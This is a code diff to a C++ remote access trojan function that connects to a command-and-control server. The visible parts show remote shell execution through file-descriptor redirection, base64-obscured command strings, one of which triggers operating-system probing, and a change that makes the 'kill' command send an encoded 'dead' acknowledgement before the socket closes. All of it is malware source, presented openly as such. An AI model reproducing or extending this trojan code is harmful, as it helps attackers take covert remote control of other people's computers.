@@ -155,8 +155,7 @@ void RAT(char* C2_Server, int C2_Port)
                     }
 
                     std::cout << "Exiting shell exec..." << std::endl;
-
-
+                    
                     // Recover fd's and close duplicates
                     dup2(dup_orig_stdin,0);
                     dup2(dup_orig_stdout,1);
@@ -177,6 +176,7 @@ void RAT(char* C2_Server, int C2_Port)
                     memset(buffer, 0, sizeof(buffer));
                     memset(CommandReceived, 0, sizeof(CommandReceived));
                 }
+                // Operating System
                 else if ((strcmp(command, "UHJvYmluZyBPcGVyYXRpbmcgU3lzdGVt") == 0))
                 {
                     char buffer[257] = "";
@@ -252,6 +252,10 @@ void RAT(char* C2_Server, int C2_Port)
                 }
                 else if (strcmp(command, "kill") == 0) 
                 {
+                    char buffer[64] = "";
+                    strcat(buffer,"ZGVhZA");
+                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+
                     close(tcp_sock);
                     std::cout << "Socket killed. Sleep Start" << std::endl;
                     sleep(1);
